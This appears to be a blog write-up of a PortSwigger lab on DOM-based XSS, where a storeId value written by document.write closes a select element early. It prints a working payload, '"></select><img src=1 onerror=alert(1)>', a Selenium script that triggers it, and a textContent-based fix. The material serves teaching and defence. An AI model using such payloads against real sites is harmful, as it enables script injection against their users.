---
layout: post
title: "PortSwigger: DOM XSS via document.write Inside a select Element"
date: 2026-08-30 09:00:00 -0500
categories: [Web Security, XSS]
tags: [portswigger, dom-xss, cwe-79, document-write, select-injection, javascript, selenium]
---

PortSwigger's *DOM XSS in document.write sink using source location.search inside a select element* lab demonstrates a case of DOM-based Cross-Site Scripting where the injection context is the **inner text of a `<select>` element**, not an HTML attribute. The standard attribute-breakout payload doesn't apply here — the solution requires understanding how the HTML parser handles a prematurely closed `<select>` tag.

## The Vulnerable Code

The stock-checker on the product page reads a `storeId` query parameter and writes it directly into the page using `document.write`:

```js
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
    document.write('<option selected>' + store + '</option>');
document.write('</select>');
```

The value of `storeId` lands in the **inner text** of `<option selected>`, not inside an HTML attribute. There is no sanitisation.

## Why the Standard Breakout Fails

The usual attribute-breakout payload (`"><script>alert(1)</script>`) targets the case where user input is inside an HTML attribute value. Here the input is in element inner text — breaking out of quotes achieves nothing because there are no quotes to break.

The key insight: `document.write` processes three strings sequentially, and the **HTML parser maintains state** across all three calls. If we can persuade the parser to close the `<select>` early, everything written after it is rendered as normal body HTML where event handlers fire freely.

## The Payload

Injected value for `storeId`:

```
"></select><img src=1 onerror=alert(1)>
```

Full URL:

```
/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

This produces the following effective HTML:

```html
<select name="storeId">
<option selected>"></select><img src=1 onerror=alert(1)></option>
</select>
```

The parser encounters `</select>` inside what `document.write` intended as inner text, closes the select immediately, and renders the rest as sibling elements in the document body. The `<img src=1>` tag loads with an invalid `src`; the `onerror` handler fires.

The leading `"` is harmless noise in the inner-text context — it is not interpreted as an attribute quote.

## Execution Requires a Real Browser

This is a **DOM-only sink** — the server never sees or reflects `storeId`; the injection happens entirely in the client's JavaScript engine. `curl` shows a clean response. Proof of exploit requires driving the URL in a real browser.

On Kali, headless Chromium via selenium:

```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
import urllib.parse, time

payload = '"></select><img src=1 onerror=alert(1)>'
url = "https://<target>/product?productId=1&storeId=" + urllib.parse.quote(payload)

opts = Options()
for arg in ["--headless=new", "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]:
    opts.add_argument(arg)

driver = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=opts)
driver.get(url)
time.sleep(3)
alert = driver.switch_to.alert
print("Alert fired:", alert.text)
alert.accept()
driver.quit()
```

PortSwigger's lab instrumentation hooks `alert()` — the dialog firing marks the lab solved.

## The Fix

Never pass unsanitized user input to `document.write`. Create DOM nodes programmatically instead:

```js
// safe version
const sel = document.querySelector('select[name="storeId"]');
const opt = document.createElement('option');
opt.textContent = store;   // textContent entity-encodes HTML automatically
opt.selected = true;
sel.appendChild(opt);
```

`textContent` assigns the value as plain text. The browser entity-encodes `<`, `>`, and `"` automatically — `</select>` in the value becomes the literal text `&lt;/select&gt;` and cannot close the element.

Alternatively, validate `storeId` against a server-side allowlist of known store identifiers before touching the DOM.

---

**CWE:** [CWE-79 — Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)  
**Lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
